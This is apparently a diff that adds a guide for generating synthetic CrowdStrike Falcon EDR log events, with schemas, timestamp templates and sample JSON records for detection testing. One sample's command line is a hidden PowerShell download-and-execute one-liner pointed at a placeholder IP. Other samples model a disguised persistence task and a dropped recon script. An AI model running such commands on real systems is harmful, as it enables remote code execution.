@@ -1,0 +1,168 @@
+# AI Generation Playbook: CrowdStrike Falcon EDR (CS_EDR) Telemetry
+
+## 1. Overview & Log Purpose
+**CrowdStrike Falcon Endpoint Detection and Response (EDR)** event streams—typically ingested via the **Falcon Data Replicator (FDR)** or Streaming API—record low-level kernel, OS, process, file system, registry, network, user logon, and telemetry activity from managed endpoints across Windows, macOS, and Linux platforms.
+
+### Key Monitored Activities
+* **Process Lifecycle**: Process start (`ProcessRollup2`), execution statistics (`ProcessRollup2Stats`), process termination (`EndOfProcess`).
+* **File System**: Binary creation (`PeFileWritten`, `MachOFileWritten`, `NewExecutableWritten`), script writes (`NewScriptWritten`), archive creation (`ZipFileWritten`, `OleFileWritten`), file deletion (`ExecutableDeleted`), ASEP modifications (`AsepFileChange`).
+* **Authentication & Identity**: Successful logons (`UserLogon`), logoffs (`UserLogoff`), failed authentications (`UserLogonFailed`, `UserLogonFailed2`), identity associations (`UserIdentity`).
+* **Network & DNS**: TCP/UDP connections (`NetworkConnectIP4`, `NetworkConnectIP6`), listeners (`NetworkListenIP4`), DNS queries (`DnsRequest`, `SuspiciousDnsRequest`), ARP/neighbor tables (`NeighborListIP4`).
+* **Persistence & System Changes**: Scheduled task modification (`ScheduledTaskModified`), Windows service starts (`ServiceStarted`), registry updates (`RegSystemConfigValueUpdate`), driver loading (`DriverLoad`, `KernelModeLoadImage`).
+* **Security & Sensor Status**: Firewall rules (`FirewallSetRule`, `FirewallDeleteRule`), sensor heartbeats (`SensorHeartbeat`), ETW hooks (`SetWinEventHookEtw`, `ScreenshotTakenEtw`), ML detections (`DeliverLocalFXToCloud`, `AssociateIndicator`).
+
+---
+
+## 2. Format Specification
+
+### Classification
+* **Base Format**: Single-line **Newline Delimited JSON (NDJSON)**.
+* **Strict Typing Rule**: **All values (including integers, floats, timestamps, hashes, and boolean flags) are encoded as JSON Strings (`"key": "value"`)**.
+
+### Quoting & Delimiters
+* Every JSON key and value MUST be enclosed in standard double quotes `""`.
+* Key/value pairs are separated by commas `,` without trailing commas.
+* One complete JSON record per line (`\n` line break).
+
+### Character Escaping & Encoding
+* **Windows File Paths**: Device paths use escaped backslashes: `\\Device\\HarddiskVolume2\\Windows\\System32\\cmd.exe`.
+* **NT Path Syntax**: `\\??\\C:\\Windows\\system32\\...`.
+* **HTML/Unicode Entity Escaping**: Certain nested structures (e.g., XML in `TaskXml` or firewall rules in `FirewallRule`) use Unicode escape sequences:
+  * `<` becomes `\u003c`
+  * `>` becomes `\u003e`
+  * `=` becomes `\u003d`
+  * `&` becomes `\u0026`
+
+---
+
+## 3. Schema Breakdown & Core Fields
+
+### Common Metadata Fields (Present in Almost All Events)
+| Field | Type | Description / Constraints | Example |
+| :--- | :--- | :--- | :--- |
+| `cid` | String (Hex) | 32-character Customer/Tenant Identifier (no hyphens) | `"9504041dcb954091a7e5c3211c821897"` |
+| `aid` | String (Hex) | 32-character Agent/Sensor Identifier (no hyphens) | `"cc71beda79b940fb4d9223464401c0e4"` |
+| `id` | String (UUID) | Event UUID (with hyphens) | `"acbe6864-f201-11ea-953c-069b51868641"` |
+| `aip` | String (IPv4) | Agent External/Egress IP address | `"198.51.100.1"` |
+| `event_platform` | String | Operating system platform: `Win`, `Mac`, `Lin` | `"Win"` |
+| `event_simpleName` | String | Base event type/operation name | `"ProcessRollup2"`, `"UserLogon"` |
+| `name` | String | Versioned event schema identifier | `"ProcessRollup2V17"`, `"UserLogonV8"` |
+| `timestamp` | String (Epoch ms) | Timestamp when cloud ingested the event (13 digits) | `"1599589959527"` |
+| `ContextTimeStamp` | String (Epoch sec) | Exact sensor-side execution time (seconds.fraction) | `"1599589959.084"` |
+| `ConfigBuild` | String | Sensor build version (`Major.Minor.Build.Subbuild`) | `"1007.3.0011604.1"` |
+| `ConfigStateHash` | String (Int) | Internal configuration state hash | `"372366231"`, `"3705717050"` |
+| `Entitlements` | String (Int) | License bitmask string | `"15"` |
+| `EffectiveTransmissionClass` | String (Int) | Telemetry priority tier (`0`, `1`, `2`, `3`) | `"3"` |
+
+---
+
+### Process & Thread Context
+CrowdStrike uses internal 64-bit unique identifiers for processes rather than simple OS PIDs.
+* `TargetProcessId` / `ContextProcessId` / `ParentProcessId` / `SourceProcessId`: 14 to 18-digit unique integer string (e.g., `"96415691933129"`).
+* `RawProcessId` / `EtwRawProcessId`: OS-level Process ID (e.g., `"9244"`, `"16096"`).
+* `ContextThreadId` / `SourceThreadId` / `RawThreadId`: Unique internal or OS thread ID.
+* `CommandLine`: Exact execution string including quotes, arguments, and switches.
+* `ImageFileName`: Full kernel/device binary path (e.g., `\\Device\\HarddiskVolume2\\Windows\\System32\\cmd.exe`).
+* `ParentBaseFileName`: Binary name of parent process (e.g., `explorer.exe`, `cscript.exe`).
+* `IntegrityLevel`: Windows token integrity level string (`"4096"` = Low, `"8192"` = Medium, `"12288"` = High, `"16384"` = SYSTEM).
+* `TokenType`: Token elevation/impersonation type (`"1"` = Primary, `"2"` = Impersonation).
+
+---
+
+### Identity & Authentication
+* `UserName`: User account name (e.g., `"jdoe"`, `"ADMINISTRATOR"`, `"svc_backup"`, `"SYSTEM"`, machine accounts like `"LT13749$"`).
+* `UserPrincipal`: Kerberos UPN (e.g., `"jdoe@corp.acme.com"`).
+* `LogonDomain`: Windows NetBIOS domain or machine name (e.g., `"ACME"`, `"WORKGROUP"`).
+* `UserSid`: Security Identifier (`"S-1-5-18"`, `"S-1-5-21-..."`).
+* `AuthenticationId`: LUID / Logon Session ID as integer string (`"999"` for SYSTEM, `"997"` for LocalService, `"996"` for NetworkService, random integers for user sessions).
+* `LogonType`: Windows logon types (`"2"` = Interactive, `"3"` = Network, `"4"` = Batch, `"5"` = Service, `"7"` = Unlock, `"10"` = RemoteInteractive/RDP).
+* `AuthenticationPackage`: `"Kerberos"`, `"NTLM"`, `"Negotiate"`.
+* `UserIsAdmin`: Boolean string (`"1"` or `"0"`).
+* `Status` / `SubStatus`: NTSTATUS error codes for failed logons (`"3221225572"` = `0xC0000064` / User doesn't exist; `"3221225578"` = `0xC000006A` / Bad password; `"3221225581"` = `0xC000006D` / Logon failure).
+
+---
+
+### Hashes & File Attributes
+* `SHA256HashData`: 64 lowercase hex characters.
+* `MD5HashData`: 32 lowercase hex characters.
+* `SHA1HashData`: 40 lowercase hex characters (frequently `"0000000000000000000000000000000000000000"` if not computed).
+* `Size`: File size in bytes as string.
+* `TargetFileName`: Full path of affected file.
+
+---
+
+### Network & DNS Fields
+* `LocalAddressIP4` / `RemoteAddressIP4`: IPv4 strings.
+* `LocalAddressIP6` / `RemoteAddressIP6`: IPv6 strings.
+* `LocalPort` / `RemotePort`: Port numbers as strings (`"80"`, `"443"`, `"5985"`, `"135"`).
+* `Protocol`: IANA protocol number as string (`"6"` = TCP, `"17"` = UDP, `"1"` = ICMP, `"58"` = ICMPv6).
+* `ConnectionDirection`: `"0"` = Outbound, `"1"` = Inbound, `"2"` = Listening.
+* `DomainName`: FQDN requested in DNS queries.
+* `RequestType`: DNS RR type (`"1"` = A, `"28"` = AAAA).
+
+---
+
+## 4. Timestamp & Dynamic Time Templating
+
+CrowdStrike FDR uses two primary timestamp representations simultaneously:
+
+1. **Ingestion Time (`timestamp`)**: 13-digit Unix Epoch Milliseconds.
+2. **Event Occurrence / Context Times (`ContextTimeStamp`, `ProcessStartTime`, `LogonTime`, `LogoffTime`)**: Unix Epoch Seconds with millisecond/microsecond decimal precision.
+
+### Templating Instructions
+When generating dynamic logs, compute the timestamps using the following standard template tags:
+
+* For `timestamp` (Epoch Milliseconds):
+  `"timestamp":"##$Epoch-0d0h0m0s$##000"` (or dynamically appended milliseconds).
+* For `ContextTimeStamp` / `ProcessStartTime`:
+  `"ContextTimeStamp":"##$Epoch-0d0h0m0s$##.##$Digit100-999$##"`
+* For offsets (e.g., process start vs end or logon vs logoff):
+  * Start: `"ProcessStartTime":"##$Epoch-0d0h10m0s$##.124"`
+  * Ingestion: `"timestamp":"##$Epoch-0d0h10m0s$##540"`
+  * Termination: `"ContextTimeStamp":"##$Epoch-0d0h1m0s$##.890"`
+
+---
+
+## 5. Concrete Valid Examples
+
+### Example 1: Process Creation - Suspicious PowerShell Download & Execution (`ProcessRollup2`)
+```json
+{"IntegrityLevel":"12288","ParentProcessId":"88412910381921","SourceProcessId":"88412910381921","aip":"198.51.100.25","SHA1HashData":"0000000000000000000000000000000000000000","UserSid":"S-1-5-21-2851708077-3393195298-855477758-1002","event_platform":"Win","TokenType":"1","ProcessEndTime":"","ParentBaseFileName":"explorer.exe","ImageSubsystem":"2","id":"a1e3b560-f205-11ea-8000-02a134ba7e01","EffectiveTransmissionClass":"3","SessionId":"1","Tags":"27, 151, 341","timestamp":"##$Epoch-0d0h20m0s$##210","event_simpleName":"ProcessRollup2","RawProcessId":"4928","ConfigStateHash":"372366231","MD5HashData":"a7a8d56b7c20c0f4553b6d08914b4392","SHA256HashData":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855","AuthenticationId":"4829104","ConfigBuild":"1007.3.0011604.1","CommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.50/update.ps1')\"","ParentAuthenticationId":"4829104","TargetProcessId":"96415699482103","ImageFileName":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceThreadId":"29104820194827","Entitlements":"15","name":"ProcessRollup2V17","ProcessStartTime":"##$Epoch-0d0h20m0s$##.184","aid":"cc71beda79b940fb4d9223464401c0e4","cid":"9504041dcb954091a7e5c3211c821897"}
+```
+
+### Example 2: Failed User Logon - Brute Force Attempt (`UserLogonFailed2`)
+```json
+{"Status":"3221225578","event_simpleName":"UserLogonFailed2","ContextTimeStamp":"##$Epoch-0d0h15m0s$##.412","UserName":"admin_sec","ConfigStateHash":"372366231","EtwRawProcessId":"944","ContextProcessId":"2920589061861","LogonType":"3","aip":"198.51.100.25","LogonDomain":"CORP","EtwRawThreadId":"12840","ConfigBuild":"1007.3.0011604.1","event_platform":"Win","ClientComputerName":"WORKSTATION-09","Entitlements":"15","name":"UserLogonFailed2V2","id":"b2d58f12-f205-11ea-8000-02a134ba7e02","SubStatus":"3221225578","EffectiveTransmissionClass":"2","aid":"cc71beda79b940fb4d9223464401c0e4","RemoteAddressIP4":"198.51.100.110","timestamp":"##$Epoch-0d0h15m0s$##450","cid":"9504041dcb954091a7e5c3211c821897"}
+```
+
+### Example 3: Persistence - Scheduled Task Creation (`ScheduledTaskModified`)
+```json
+{"aip":"198.51.100.25","event_platform":"Win","TokenType":"1","InterfaceGuid":"86D35949-83C9-4044-B424-DB363231FD0C","RpcClientProcessId":"1717337980180","id":"c3f79024-f205-11ea-8000-02a134ba7e03","EffectiveTransmissionClass":"3","timestamp":"##$Epoch-0d0h10m0s$##650","event_simpleName":"ScheduledTaskModified","ContextTimeStamp":"##$Epoch-0d0h10m0s$##.612","UserName":"svc_deploy","ConfigStateHash":"372366231","InterfaceVersion":"65536","RpcClientThreadId":"90858221562251","TaskXml":"\u003cTask version\u003d\"1.2\" xmlns\u003d\"http://schemas.microsoft.com/windows/2004/02/mit/task\"\u003e\u003cTriggers\u003e\u003cBootTrigger\u003e\u003cEnabled\u003etrue\u003c/Enabled\u003e\u003c/BootTrigger\u003e\u003c/Triggers\u003e\u003cPrincipals\u003e\u003cPrincipal id\u003d\"Author\"\u003e\u003cUserId\u003eS-1-5-18\u003c/UserId\u003e\u003cRunLevel\u003eHighestAvailable\u003c/RunLevel\u003e\u003c/Principal\u003e\u003c/Principals\u003e\u003cActions Context\u003d\"Author\"\u003e\u003cExec\u003e\u003cCommand\u003eC:\\Windows\\Temp\\update_service.exe\u003c/Command\u003e\u003c/Exec\u003e\u003c/Actions\u003e\u003c/Task\u003e","TaskAuthor":"CORP\\svc_deploy","AuthenticationId":"999","ConfigBuild":"1007.3.0011604.1","TaskName":"Microsoft\\Windows\\Maintenance\\ServiceHealthUpdate","RpcOpNum":"1","Entitlements":"15","name":"ScheduledTaskModifiedV2","TaskExecArguments":"","aid":"cc71beda79b940fb4d9223464401c0e4","TaskExecCommand":"C:\\Windows\\Temp\\update_service.exe","RpcNestingLevel":"0","cid":"9504041dcb954091a7e5c3211c821897"}
+```
+
+### Example 4: Network Outbound Connection (`NetworkConnectIP4`)
+```json
+{"LocalAddressIP4":"198.51.100.25","event_simpleName":"NetworkConnectIP4","ContextTimeStamp":"##$Epoch-0d0h5m0s$##.105","ConfigStateHash":"526721166","ConnectionFlags":"0","ContextProcessId":"96415699482103","RemotePort":"443","aip":"198.51.100.25","ConfigBuild":"1007.3.0011604.1","event_platform":"Win","LocalPort":"51234","Entitlements":"15","name":"NetworkConnectIP4V5","id":"d4a80135-f205-11ea-8000-02a134ba7e04","Protocol":"6","EffectiveTransmissionClass":"3","aid":"cc71beda79b940fb4d9223464401c0e4","RemoteAddressIP4":"198.51.100.50","ConnectionDirection":"0","InContext":"0","timestamp":"##$Epoch-0d0h5m0s$##150","cid":"9504041dcb954091a7e5c3211c821897"}
+```
+
+### Example 5: Suspicious Script Dropped to Disk (`NewScriptWritten`)
+```json
+{"Options":"83886176","ContextThreadId":"214887041898296","MinorFunction":"0","aip":"198.51.100.25","Information":"2","FileIdentifier":"90b5e33d77507b4a8721ecb562d909fb610d000000004401","event_platform":"Win","ShareAccess":"1","id":"e5b91246-f205-11ea-8000-02a134ba7e05","FileObject":"18446631971079767936","EffectiveTransmissionClass":"3","FileAttributes":"128","timestamp":"##$Epoch-0d0h2m0s$##330","Status":"0","event_simpleName":"NewScriptWritten","ContextTimeStamp":"##$Epoch-0d0h2m0s$##.290","ConfigStateHash":"372366231","ContextProcessId":"96415699482103","IrpFlags":"2180","ConfigBuild":"1007.3.0011604.1","MajorFunction":"0","DesiredAccess":"1180054","Entitlements":"15","name":"NewScriptWrittenV7","OperationFlags":"0","aid":"cc71beda79b940fb4d9223464401c0e4","cid":"9504041dcb954091a7e5c3211c821897","TargetFileName":"\\Device\\HarddiskVolume4\\Users\\Public\\Downloads\\recon_script.ps1"}
+```
+
+---
+
+## 6. Key Constraints & Common Pitfalls
+
+1. **Quote All Values**: Never output raw numeric literals or booleans. `{"IntegrityLevel": 16384}` will fail schema parsers expecting `"IntegrityLevel": "16384"`.
+2. **Schema Version Suffixes**: The `name` field must match `event_simpleName` with the version suffix (e.g., `event_simpleName: "ProcessRollup2"` $\rightarrow$ `name: "ProcessRollup2V17"`; `event_simpleName: "UserLogon"` $\rightarrow$ `name: "UserLogonV8"`). For Mac, it frequently includes `Mac` (e.g., `DnsRequestMacV1`).
+3. **Internal vs. OS PIDs**:
+   * Do NOT use standard 4-digit or 5-digit OS PIDs in `TargetProcessId`, `ContextProcessId`, or `ParentProcessId`. Use synthetic 14–18 digit integers (e.g., `"96415693097233"`).
+   * Use standard OS PIDs exclusively for `RawProcessId` and `EtwRawProcessId`.
+4. **NT / Native Paths**:
+   * File access/write events (`PeFileWritten`, `ImageFileName`, `TargetFileName`) use NT namespace device paths: `\\Device\\HarddiskVolume[0-9]\\...`.
+   * CLI strings (`CommandLine`) typically use standard DOS drive paths: `C:\\Windows\\system32\\...`.
+5. **Correlation Consistency**: When generating a multi-event scenario (e.g., process launch $\rightarrow$ script drop $\rightarrow$ network connect):
+   * `aid` and `cid` must remain identical across events from the same host.
+   * `TargetProcessId` from `ProcessRollup2` must match `ContextProcessId` in the subsequent `NewScriptWritten` and `NetworkConnectIP4` events.
+   * `ProcessStartTime` $\le$ `ContextTimeStamp` $\le$ `timestamp`.
